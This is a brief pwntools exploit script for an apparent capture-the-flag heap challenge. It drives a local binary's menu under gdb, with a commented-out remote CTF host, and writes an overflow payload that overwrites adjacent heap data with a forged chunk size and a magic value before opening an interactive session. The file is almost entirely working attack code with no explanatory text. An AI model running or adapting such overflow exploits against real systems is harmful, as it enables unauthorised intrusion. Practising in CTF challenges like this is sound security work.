from pwn import *

def w(s):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(s)
def v():
    p.recvuntil("> ")
    p.sendline("1")
def c():
    p.recvuntil("> ")
    p.sendline("3")




elf = context.binary = ELF("./pwn")
p = process()
gdb.attach(p)

# p = remote("heap0x0.pwny.shellmates.club",446,ssl=True)


w(b"a" * 0x18 + p64(0x21) + p64(0xcafebabe)) 

v()
c()


p.interactive()